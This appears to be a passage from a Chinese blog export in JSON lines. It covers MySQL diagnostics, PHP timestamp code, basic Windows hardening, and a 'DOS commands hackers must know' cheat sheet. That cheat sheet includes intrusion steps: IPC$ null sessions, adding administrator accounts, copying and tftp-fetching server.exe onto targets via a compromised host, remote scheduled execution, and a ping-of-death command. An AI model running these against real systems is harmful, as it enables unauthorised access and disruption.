TABLES，等待其他线程关闭数据表。<br>\nKilled<br>\n　发送了一个kill请求给某线程，那么这个线程将会检查kill标志位，同时会放弃下一个kill请求。MySQL会在每次的主循环中检查kill标志位，不过有些情况下该线程可能会过一小段才能死掉。如果该线程程被其他线程锁住了，那么kill请求会在锁释放时马上生效。<br>\nLocked<br>\n　被其他查询锁住了。<br>\nSending data<br>\n　正在处理SELECT查询的记录，同时正在把结果发送给客户端。<br><br>\nSorting for group<br>\n　正在为GROUP BY做排序。<br>\n　Sorting for order<br>\n　正在为ORDER BY做排序。<br>\nOpening tables<br>\n　这个过程应该会很快，除非受到其他因素的干扰。例如，在执ALTER TABLE或LOCK TABLE语句行完以前，数据表无法被其他线程打开。正尝试打开一个表。<br>\nRemoving duplicates<br>\n　正在执行一个SELECT DISTINCT方式的查询，但是MySQL无法在前一个阶段优化掉那些重复的记录。因此，MySQL需要再次去掉重复的记录，然后再把结果发送给客户端。<br><br>\nReopen table<br>\n　获得了对一个表的锁，但是必须在表结构修改之后才能获得这个锁。已经释放锁，关闭数据表，正尝试重新打开数据表。<br>\nRepair by sorting<br>\n　修复指令正在排序以创建索引。<br>\nRepair with keycache<br>\n　修复指令正在利用索引缓存一个一个地创建新索引。它会比Repair by sorting慢些。<br>\nSearching rows for update<br>\n　正在讲符合条件的记录找出来以备更新。它必须在UPDATE要修改相关的记录之前就完成了。<br>\nSleeping<br>\n　正在等待客户端发送新请求.<br><br>\nSystem lock<br>\n　正在等待取得一个外部的系统锁。如果当前没有运行多个mysqld服务器同时请求同一个表，那么可以通过增加--skip-external-locking参数来禁止外部系统锁。<br>\nUpgrading lock<br>\n　INSERT DELAYED正在尝试取得一个锁表以插入新记录。<br>\nUpdating<br>\n　正在搜索匹配的记录，并且修改它们。<br><br>\nUser Lock<br>\n　正在等待GET_LOCK()。<br>\nWaiting for tables<br>\n　该线程得到通知，数据表结构已经被修改了，需要重新打开数据表以取得新的结构。然后，为了能的重新打开数据表，必须等到所有其他线程关闭这个表。以下几种情况下会产生这个通知：FLUSH TABLES tbl_name, ALTER TABLE, RENAME TABLE, REPAIR TABLE, ANALYZE TABLE,或OPTIMIZE TABLE。<br>\nwaiting for handler insert<br>\n　INSERT DELAYED已经处理完了所有待处理的插入操作，正在等待新的请求。<br>\n　大部分状态对应很快的操作，只要有一个线程保持同一个状态好几秒钟，那么可能是有问题发生了，需要检查一下。<br>\n　还有其他的状态没在上面中列出来，不过它们大部分只是在查看服务器是否有存在错误是才用得着。<br><br>\n例如如图：<br><br>\n3、explain来了解SQL执行的状态<br>\nexplain显示了mysql如何使用索引来处理<a href=\"https://www.baidu.com/s?wd=select%E8%AF%AD%E5%8F%A5&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao\" rel=\"nofollow\">select语句</a>以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。<br>\n使用方法，在<a href=\"https://www.baidu.com/s?wd=select%E8%AF%AD%E5%8F%A5&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao\" rel=\"nofollow\">select语句</a>前加上explain就可以了：<br>\n例如：<br>\nexplain select surname,first_name form a,b where a.id=b.id<br>\n结果如图<br><br>\nEXPLAIN列的解释<br>\ntable<br>\n显示这一行的数据是关于哪张表的<br>\ntype<br>\n这是重要的列，显示连接使用了何种类型。从最好到最差的连接类型为const、eq_reg、ref、range、indexhe和ALL<br>\npossible_keys<br>\n显示可能应用在这张表中的索引。如果为空，没有可能的索引。可以为相关的域从WHERE语句中选择一个合适的语句<br>\nkey<br>\n实际使用的索引。如果为NULL，则没有使用索引。很少的情况下，MYSQL会选择优化不足的索引。这种情况下，可以在<a href=\"https://www.baidu.com/s?wd=SELECT%E8%AF%AD%E5%8F%A5&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao\" rel=\"nofollow\">SELECT语句</a> 中使用USE INDEX（indexname）来强制使用一个索引或者用IGNORE INDEX（indexname）来强制MYSQL忽略索引<br>\nkey_len<br>\n使用的索引的长度。在不损失精确性的情况下，长度越短越好<br>\nref<br>\n显示索引的哪一列被使用了，如果可能的话，是一个常数<br>\nrows<br>\nMYSQL认为必须检查的用来返回请求数据的行数<br>\nExtra<br>\n关于MYSQL如何解析查询的额外信息。将在表4.3中讨论，但这里可以看到的坏的例子是Using temporary和Using filesort，意思MYSQL根本不能使用索引，结果是检索会很慢<br><br>\nextra列返回的描述的意义<br>\nDistinct<br>\n一旦MYSQL找到了与行相联合匹配的行，就不再搜索了<br>\nNot exists<br>\nMYSQL优化了LEFT JOIN，一旦它找到了匹配LEFT JOIN标准的行，就不再搜索了<br>\nRange checked for each Record（index map:#）<br>\n没有找到理想的索引，因此对于从前面表中来的每一个行组合，MYSQL检查使用哪个索引，并用它来从表中返回行。这是使用索引的最慢的连接之一<br>\nUsing filesort<br>\n看到这个的时候，查询就需要优化了。MYSQL需要进行额外的步骤来发现如何对返回的行排序。它根据连接类型以及存储排序键值和匹配条件的全部行的行指针来排序全部行<br>\nUsing index<br>\n列数据是从仅仅使用了索引中的信息而没有读取实际的行动的表返回的，这发生在对表的全部的请求列都是同一个索引的部分的时候<br>\nUsing temporary<br>\n看到这个的时候，查询需要优化了。这里，MYSQL需要创建一个临时表来存储结果，这通常发生在对不同的列集进行ORDER BY上，而不是GROUP BY上<br>\nWhere used<br>\n使用了WHERE从句来限制哪些行将与下一张表匹配或者是返回给用户。如果不想返回表中的全部行，并且连接类型ALL或index，这就会发生，或者是查询有问题不同连接类型的解释（按照效率高低的顺序排序）<br>\nconst<br>\n表中的一个记录的最大值能够匹配这个查询（索引可以是主键或惟一索引）。因为只有一行，这个值实际就是常数，因为MYSQL先读这个值然后把它当做常数来对待<br>\neq_ref<br>\n在连接中，MYSQL在查询时，从前面的表中，对每一个记录的联合都从表中读取一个记录，它在查询使用了索引为主键或惟一键的全部时使用<br>\nref<br>\n这个连接类型只有在查询使用了不是惟一或主键的键或者是这些类型的部分（比如，利用最左边前缀）时发生。对于之前的表的每一个行联合，全部记录都将从表中读出。这个类型严重依赖于根据索引匹配的记录多少—越少越好<br>\nrange<br>\n这个连接类型使用索引返回一个范围中的行，比如使用&gt;或&lt;查找东西时发生的情况<br>\nindex<br>\n这个连接类型对前面的表中的每一个记录联合进行完全扫描（比ALL更好，因为索引一般小于表数据）<br>\nALL<br>\n这个连接类型对于前面的每一个记录联合进行完全扫描，这一般比较糟糕，应该尽量避免</p>                                    </div>", "log_PostTime": 1584891072, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP获取今天，昨天，本月，上个月，本年 起始时间戳", "log_Intro": "PHP获取今天，昨天，本月，上个月，本年 起始时间戳", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <pre class=\"has\">\n<code class=\"hljs language-php\">date_default_timezone_set(\"Asia/Shanghai\"); //设置为上海时间 否则开始时间会相差8个小时\n //获取今日开始时间戳和结束时间戳\n$beginToday=mktime(0,0,0,date('m'),date('d'),date('Y'));\n$endToday=mktime(0,0,0,date('m'),date('d')+1,date('Y'))-1;\n \n//获取昨日起始时间戳和结束时间戳\n$beginYesterday=mktime(0,0,0,date('m'),date('d')-1,date('Y'));\n$endYesterday=mktime(0,0,0,date('m'),date('d'),date('Y'))-1;\n \n//获取本周起始时间戳和结束时间戳 \n$beginThisweek = mktime(0,0,0,date('m'),date('d')-date('w')+1,date('y'));\n$endThisweek=time();\n \n//获取上周起始时间戳和结束时间戳\n$beginLastweek=mktime(0,0,0,date('m'),date('d')-date('w')+1-7,date('Y'));\n$endLastweek=mktime(23,59,59,date('m'),date('d')-date('w')+7-7,date('Y'));\n \n//获取本月起始时间戳和结束时间戳\n$beginThismonth=mktime(0,0,0,date('m'),1,date('Y'));\n$endThismonth=mktime(23,59,59,date('m'),date('t'),date('Y'));\n \n //上个月的起始时间:\n$begin_time = strtotime(date('Y-m-01 00:00:00',strtotime('-1 month')));\n$end_time = strtotime(date(\"Y-m-d 23:59:59\", strtotime(-date('d').'day')));\n \n$begin_year = strtotime(date(\"Y\",time()).\"-1\".\"-1\"); //本年开始\n$end_year = strtotime(date(\"Y\",time()).\"-12\".\"-31\"); //本年结束\n \n//现在的时间到第二天凌晨相差的时间戳\n$time = (strtotime(date('Y-m-d'))+3600*24) - time() ; </code></pre>\n\n<p> </p>\n\n<p>转摘：<a href=\"https://blog.csdn.net/weialemon/article/details/78959125\">https://blog.csdn.net/weialemon/article/details/78959125</a></p>                                    </div>", "log_PostTime": 1584891074, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "黑客基础知识与防护（一）", "log_Intro": "黑客基础知识与防护（一）", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>名称介绍：hacker  cracker honke</p>\n\n<p>木马：灰鸽子、黑洞、PcShare</p>\n\n<p>rootkit 工具：ntroorkit</p>\n\n<p>IPC$： 命名管道</p>\n\n<p>加壳： UPX、ASPack、Pepack、PECompact、UPack、免疫007、木马彩衣</p>\n\n<p>查看系统启动项       运行 MSconfig 命令</p>\n\n<p>调出注册表编辑器   运行Regedit命令</p>\n\n<p>Netstat  -an 查看异常端口</p>\n\n<p>“计算机”右键-》“管理”    “事件查看器”-》windows日志-》安全</p>\n\n<p>存在陌生用户  net vert 查看账户信息</p>\n\n<p>查看系统服务</p>\n\n<p>1.关闭“文件和打印共享”</p>\n\n<p>2.禁用Guest账号    控制面板-》用户账号-》管理其他账号</p>\n\n<p>3.禁止建立空连接  打开注册表HKEY_LOCAL_MACHINE\\System\\Current-ControlSet\\Control\\LSA,将DWORD值RestrictAnonymous的键值改为1。</p>\n\n<p>4.关闭不必要的端口 （安装Netwatch）</p>\n\n<p>5.不要回陌生人的邮件</p>\n\n<p>6.更换管理员账号 （设置复杂密码简单权限的Administrator账号欺骗入侵者）</p>\n\n<p> </p>                                    </div>", "log_PostTime": 1584891075, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "黑客基础知识与防护（二）", "log_Intro": "黑客基础知识与防护（二）", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>黑客常用攻击手段</h2>\n\n<p>后门程序、信息炸弹、拒绝服务（分布式DOS攻击）、密码破解、系统漏洞、木马与病毒、SQL注入攻击。</p>\n\n<h2>黑客攻防常用命令</h2>\n\n<p>win+R  调出 “运行” 输入 cmd</p>\n\n<h3>PING 命令</h3>\n\n<p>用法：ping [-t][-a][-n count][-l size]</p>\n\n<p>参数：-t  不间断发送     -a 将地址解析成主机名   -n count 定义向目标发送次数  -l size 定义数据大小</p>\n\n<h3>NBTSTAT命令</h3>\n\n<p>用法：nbtstat [-a RemoteName] [-A IP address] [-n]</p>\n\n<p>参数：-a  通过远程主机名获取NETBIOS信息   -A  通过IP获取NETBIOS信息    -n  列出本地机器NETBIOS信息</p>\n\n<h3>NETSTAT命令</h3>\n\n<p>用法：netstat [-a][-b][-e][-f][-n][-o][-p proto][-r][-s][-t][interval]</p>\n\n<p>参数：-a:查看本地所有端口   -r:列出路由信息  -b:显示在创建每个连接或侦听端口时涉及的可执行程序  -t:显示当前连接卸载状态</p>\n\n<p>-f:显示外部地址的完全限定域名(FQDN)   -n:以数字形式显示地址和端口号   -o:显示拥有的与每个连接关系的进程ID </p>\n\n<p>-p proto:显示proto指定的协议的连接，proto可以是下列任何一个IP、IPV6、ICMPV6、TCP、TCPV6、UDP或UDPV6</p>\n\n<h3>TRACERT命令</h3>\n\n<p>用法：tracert [-d][-h maximum_hops][-j host-list][-w timeout][-R][-s srcaddr][-4][-6] target_name</p>\n\n<p>参数：-d:不将地址解析成主机名   -h maximum-hops: 搜索目标的最大跃点数   -j host-list:与主机列表  -w timeout :等待每一个回复的超时时间   -R:跟踪往返行程路径（仅适合用于IPV6）  -S srcaddr:要使用的源地址（仅适合用于IPV6） -4:强制使用IPV4  -6:强制使用IPV6</p>\n\n<h3>IPCONFIG命令</h3>\n\n<p>用于查看当前计算机的TCP/IP配置的预设值</p>\n\n<h3>ARP命令</h3>\n\n<p>可以进行IP地址和MAC地址的欺骗，网络管理员通过此命令可以修改ARP缓存表</p>\n\n<h3>AT命令</h3>\n\n<p>用于安排在特定日期或时间执行某个特定的命令和程序</p>\n\n<h3>NSLOOKUP命令</h3>\n\n<p>用来监测网络中的DNS服务器是否能正确实现域名解析。黑客可以通过此命令探测一个大型网站究竟绑定了多少IP地址</p>\n\n<h3>NET命令</h3>\n\n<p>可以管理网络、服务、用户、登录等本地或远程信息</p>\n\n<p>net view：查看局域网中所有共享资源，格式为net view \\\\IP</p>\n\n<p>net use：用于建立与断开计算机与共享资源的连接，格式为net use 本地盘符\\\\IP\\共享名</p>\n\n<p>net user：查看和账号有关的情况</p>\n\n<p>net time ：查看远程主机当前时间</p>\n\n<p>net share ：用于管理共享资源</p>\n\n<p>net localgroup：查看所有和用户有关的信息，并且进行相关操作</p>\n\n<p>net start/stop：用于启动远程主机上的服务</p>\n\n<h3>FTP命令</h3>\n\n<p>网络上开放的ftp的主机很多，其中大部分是匿名的，也就是说任何人都可以登录</p>\n\n<h3>TELNET命令</h3>\n\n<p>功能强大的远程登录命令</p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>                                    </div>", "log_PostTime": 1584891076, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "怎么卸载云骑士装机大师", "log_Intro": "怎么卸载云骑士装机大师", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>云骑士装机大师是一款免费的重装系统工具，这款软件内置的系统全都是原装正版系统纯净无添加。软件支持GTP与win10平板，使用非常简单，对于小白用户来说也可以轻松装系统了。</p>\n\n<p><strong>方法步骤</strong></p>\n\n<p>1.首先在PC下载网搜索下载云骑士装机大师软件，小编已经为大家准备好，点击下载即可。</p>\n\n<p>2.云骑士装机大师是一款非常好用的系统装机软件，非常适合电脑小白用户使用，重装系统步骤超级简单，简单到只要你点击几下鼠标即可，剩下的事交给云骑士装机大师即可。但是在重装系统之后每次进入到系统前都会需要用户选择系统，今天小编就来教大家如何卸载删除云骑士装机大师。</p>\n\n<p><img alt=\"QQ截图20171110140609.png\" class=\"has\" height=\"240\" src=\"http://www.pcsoft.com.cn/d/file/article/syjc/2017-11-10/196bfd76462f7d58a9744293a9ff9350.png\" width=\"430\"></p>\n\n<p>3.我们打开运行窗口，用户可以使用win+r组合键来打开，然后在里面输入msconfig然后点击回车打开。</p>\n\n<p><img alt=\"16-1F2211A945428.jpg\" class=\"has\" height=\"234\" src=\"http://www.pcsoft.com.cn/d/file/article/syjc/2017-11-10/4b148f92ec38a17779bcb725f8f0f15c.jpg\" width=\"409\"></p>\n\n<p>4.然后我们在打开的系统配置页面上，切换到引导选项，在里面能够看到当前电脑安装的可以启动的系统，如果安装了云骑士装机大师的小伙伴能够看到对应的选项，我们选中这个项目点击删除即可。</p>\n\n<p><img alt=\"16-1F2211A949260.jpg\" class=\"has\" height=\"365\" src=\"http://www.pcsoft.com.cn/d/file/article/syjc/2017-11-10/a3deead77734bc485f1426e525874f03.jpg\" width=\"500\"></p>\n\n<p>5.如果不想卸载的用户，可以在刚才删除的位置上不选择删除，而是在系统默认的系统上选择设为默认值，然后将下面的超时选择时间缩短一下，这样用户就看不到对应的选项了。</p>\n\n<p><img alt=\"16-1F2211A949260.jpg\" class=\"has\" height=\"365\" src=\"http://www.pcsoft.com.cn/d/file/article/syjc/2017-11-10/db9de91f0b06f1fbb1b9e95f87205afb.jpg\" width=\"500\"></p>\n\n<p><strong>总结</strong></p>\n\n<p>以上就是云骑士装机大师卸载的教程了，小伙伴们如果对每次开机都出现这个表示很头疼的话就赶紧来给删除掉吧。</p>\n\n<p>转载网站:<a href=\"http://www.pcsoft.com.cn/article/15483.html\" rel=\"nofollow\">http://www.pcsoft.com.cn/article/15483.html</a></p>                                    </div>", "log_PostTime": 1584891077, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "DOS命令大全 黑客必知的DOS命令集合", "log_Intro": "DOS命令大全 黑客必知的DOS命令集合", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>一般来说dos命令都是在dos程序中进行的，如果电脑中安装有dos程序可以从开机选项中选择进入，在windows 系统中我们还可以从开始运行中输入cmd命令进入操作系统中的dos命令，如下图：</p>\n\n<p><a href=\"https://files.jb51.net/file_images/article/201606/20160626172711.png\" rel=\"nofollow\"><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201606/20160626172711.png\"></a></p>\n\n<p>严格的说，windows 中的命令窗口并不是真正意义上的dos操作界面，其功能并不全面，真正的dos程序是在电脑中没进入系统而进入的dos界面，如下图：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://files.jb51.net/file_images/article/201606/20160626172712.png\"></p>\n\n<p>如上图，我们只要在dos界面中输入各种dos命令，即可实现相应的命令，下面分享下dos命令大全：<br>\nnet use ipipc$ \" \" /user:\" \" 建立IPC空链接<br>\nnet use ipipc$ \"密码\" /user:\"用户名\" 建立IPC非空链接<br>\nnet use h: ipc$ \"密码\" /user:\"用户名\" 直接登陆后映射对方C：到本地为H:<br>\nnet use h: ipc$ 登陆后映射对方C：到本地为H:<br>\nnet use ipipc$ /del 删除IPC链接<br>\nnet use h: /del 删除映射对方到本地的为H:的映射<br>\nnet user 用户名　密码　/add 建立用户<br>\nnet user guest /active:yes 激活guest用户<br>\nnet user 查看有哪些用户<br>\nnet user 帐户名 查看帐户的属性<br>\nnet locaLGroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数<br>\nnet start 查看开启了哪些服务<br>\nnet start 服务名　 开启服务；(如:net start telnet， net start schedule)<br>\nnet stop 服务名 停止某服务<br>\nnet time 目标ip 查看对方时间<br>\nnet time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息<br>\nnet view 查看本地局域网内开启了哪些共享<br>\nnet view ip 查看对方局域网内开启了哪些共享<br>\nnet config 显示系统网络设置<br>\nnet logoff 断开连接的共享<br>\nnet pause 服务名 暂停某服务<br>\nnet send ip \"文本信息\" 向对方发信息<br>\nnet ver 局域网内正在使用的网络连接类型和信息<br>\nnet share 查看本地开启的共享<br>\nnet share ipc$ 开启ipc$共享<br>\nnet share ipc$ /del 删除ipc$共享<br>\nnet share c$ /del 删除C：共享<br>\nnet user guest 12345 用guest用户登陆后用将密码改为12345<br>\nnet password 密码 更改系统登陆密码<br>\nnetstat -a 查看开启了哪些端口,常用netstat -an<br>\nnetstat -n 查看端口的网络连接情况，常用netstat -an<br>\nnetstat -v 查看正在进行的工作<br>\nnetstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）<br>\nnetstat -s 查看正在使用的所有协议使用情况<br>\nnBTstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>\ntrAcert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。<br>\nping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。<br>\nping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)<br>\nipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息<br>\ntlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>\nkill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>\ndel -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件</p>\n\n<p><br>\ndel /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>\nmove 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖<br>\nfc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，\"&gt; \"和\"&gt; &gt;\" 是重定向命令<br>\nat id号 开启已注册的某个计划任务<br>\nat /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止<br>\nat id号 /delete 停止某个已注册的计划任务<br>\nat 查看所有的计划任务<br>\nat ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机<br>\nfinger username @host 查看最近有哪些用户登陆<br>\ntelnet ip 端口 远和登陆服务器,默认端口为23<br>\nopen ip 连接到IP（属telnet登陆后的命令）<br>\ntelnet 在本机上直接键入telnet 将进入本机的telnet<br>\ncopy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br>\ncopy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下<br>\ncppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br>\ncopy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：<br>\nxcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件<br>\ntftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送<br>\ntftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机<br>\nftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)<br>\nroute print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br>\narp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br>\nstart 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令<br>\nmem 查看cpu使用情况<br>\nattrib 文件名(目录名) 查看某文件（目录）的属性<br>\nattrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性<br>\ndir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br>\ndate /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间<br>\nset 指定环境变量名称=要指派给变量的字符 设置环境变量<br>\nset 显示当前所有的环境变量<br>\nset p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量<br>\npause 暂停批处理程序，并显示出：请按任意键继续....<br>\nif 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>\ngoto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）<br>\ncall 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br>\nfor 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>\necho on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>\necho 信息 在屏幕上显示出信息<br>\necho 信息 &gt;&gt; pass.txt 将\"信息\"保存到pass.txt文件中<br>\nfindstr \"Hello\" aa.txt 在aa.txt文件中寻找字符串hello<br>\nfind 文件名 查找某文件<br>\ntitle 标题名字 更改CMD窗口标题名字<br>\ncolor 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br>\nprompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>\n\n<p>ver 在DOS窗口下显示版本信息<br>\nwinver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>\nformat 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br>\nmd　目录名 创建目录<br>\nreplace 源文件　要替换文件的目录 替换文件<br>\nren 原文件名　新文件名 重命名文件名<br>\ntree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>\ntype 文件名 显示文本文件的内容<br>\nmore 文件名 逐屏显示输出文件<br>\ndoskey 要锁定的命令＝字符<br>\ndoskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br>\ntaskmgr 调出任务管理器<br>\nchkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br>\ntlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br>\nexit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br>\npath 路径可执行文件的文件名 为可执行文件设置一个路径。<br>\ncmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>\nregedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；<br>\nregedit /e 注册表文件名 导出注册表</p>\n\n<p><strong>cacls 文件名</strong>　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。<br>\ncacls 文件名 查看文件的访问用户权限列表<br>\nREM 文本内容 在批处理文件中添加注解<br>\nnetsh 查看或更改本地网络配置情况</p>\n\n<p><strong>IIS服务命令： </strong><br>\niisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>\niisreset /start或stop 启动（停止）所有Internet服务<br>\niisreset /restart 停止然后重新启动所有Internet服务<br>\niisreset /status 显示所有Internet服务状态<br>\niisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>\niisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>\niisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>\niisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>\nFTP 命令： (后面有详细说明内容)<br>\nftp的命令行格式为:<br>\nftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>\n－d 使用调试方式。<br>\n－n 限制ftp的自动登录,即不使用.netrc文件。<br>\n－g 取消全局文件名。<br>\nhelp [命令] 或 ？[命令] 查看命令说明<br>\nbye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br>\npwd 列出当前远端主机目录<br>\nput 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>\nget 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>\nmget [remote-files] 从远端主机接收一批文件至本地主机<br>\nmput local-files 将本地主机中一批文件传送至远端主机<br>\ndir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br>\nascii 设定以ASCII方式传送文件(缺省值)<br>\nbin 或 image 设定以二进制方式传送文件<br>\nbell 每完成一次文件传送,报警提示<br>\ncdup 返回上一级目录<br>\nclose 中断与远程服务器的ftp会话(与open对应)<br>\nopen host[port] 建立指定ftp服务器连接,可指定连接端口<br>\ndelete 删除远端主机中的文件<br>\nmdelete [remote-files] 删除一批文件<br>\nmkdir directory-name 在远端主机中建立目录<br>\nrename [from] [to] 改变远端主机中的文件名<br>\nrmdir directory-name 删除远端主机中的目录<br>\nstatus 显示当前FTP的状态<br>\nsystem 显示远端主机系统类型<br>\nuser user-name [password] [account] 重新以别的用户名登录远端主机<br>\nopen host [port] 重新建立一个新的连接<br>\nprompt 交互提示模式<br><strong>macdef 定义宏命令</strong></p>\n\n<p>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br>\nchmod 改变远端主机的文件权限<br>\ncase 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br>\ncd remote－dir 进入远程主机目录<br>\ncdup 进入远程主机目录的父目录<br>\n! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip</p>\n\n<p><strong>MYSQL 命令： </strong><br>\nmysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br>\n（例：mysql -h110.110.110.110 -Uroot -P123456<br>\n注:u与root可以不用加空格，其它也一样）<br>\nexit 退出MYSQL<br>\nmysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>\ngrant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>\nshow databases; 